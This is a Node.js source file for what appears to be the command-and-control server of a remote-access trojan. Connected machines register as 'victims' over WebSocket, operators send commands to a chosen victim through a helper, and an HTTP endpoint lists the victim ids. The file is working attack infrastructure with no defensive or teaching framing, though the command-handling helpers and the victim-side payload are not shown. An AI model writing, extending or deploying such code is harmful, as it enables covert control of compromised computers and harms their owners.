const app = require('express')();
const server = require('http').Server(app);
const ws = require('ws');
const wss = new ws.Server({
	server,
});
const wsSelected = new Set();
var target = ``;
const colors = require(`colors162`);
const sendId = require('./funcs/sendId');
const findById = require('./funcs/findById');
const sendCmd2 = require('./funcs/sendCmd2');
const currentDate = new Date();
const currentHour = currentDate.getHours();
const currentMinute = currentDate.getMinutes();
const timestamp = `[${currentHour}:${currentMinute}]`;
var victims = [];
var port = process.env.PORT // || 2000


wss.on('connection', (w) => {
	target = ``;
	var id = Math.floor(Math.random() * 1000000);
	wsSelected.add({ w, id });
	sendId(w, id);
	w.on('message', async (d) => {
		var data = JSON.parse(d);
		// console.log(data)
		checkClients();

		if (data.data.event == 'newClient') {
			console.log(
				colors.Orange(timestamp),
				`New client is now connected | [${data.data.uuid}] `
			);
		}

		if (data.data.event == 'newVictim') {
			victims.push({ uuid: data.data.uuid, w });
			console.log(
				colors.Orange(timestamp),
				`New victim is now connected | [${data.data.uuid}]`
			);
		}
		if (data.data.event == `ignore`) {
			wsSelected.forEach((w) =>
				w.w.send(
					JSON.stringify({
						data: `ignore`,
					})
				)
			);
		}
		if (data.data.event == 'cmd') {
			target = await findById(wsSelected, data.data.target);
			// console.log(target)<
			sendCmd2(
				data.data.cmd,
				data.data.target,
				data.data.uuid,
				target[0].w,
				data.data.data,
				data.data.role
			);
			// if (data.data.cmd == `test`){
			//   target = await findById(wsSelected, data.data.uuid)
			//   target[0].w.send(JSON.stringify({
			//     data:`test`
			//   }))
			//   }
			// if(data.data.cmd == `ping`){
			//   target = await findById(wsSelected, data.data.target)
			//   // console.log(target)
			//   sendCmd2(`ping`, data.data.target, data.data.uuid, target[0].w, data.data.data, data.data.role)
			// }
		}

		w.on('close', () => {
			console.log(
				colors.Orange(timestamp),
				`[${data.data.uuid}] has disconnected`
			);
		});
	});
});

server.listen(port, () => {
	console.log(`Server is now listening on port ${port}...`);
});

app.get('/victims', (req, res) => {
	var v = [];
	for (i = 0; i < victims.length; i++) {
		v.push(victims[i].uuid);
	}
	res.json(v);
});

async function checkClients() {
	let tempClients = [];
	victims.forEach((e) => {
		if (e.w.readyState == ws.OPEN) {
			tempClients.push({ uuid: e.uuid, w: e.w });
		}
	});
	victims = tempClients;
	return victims;
}
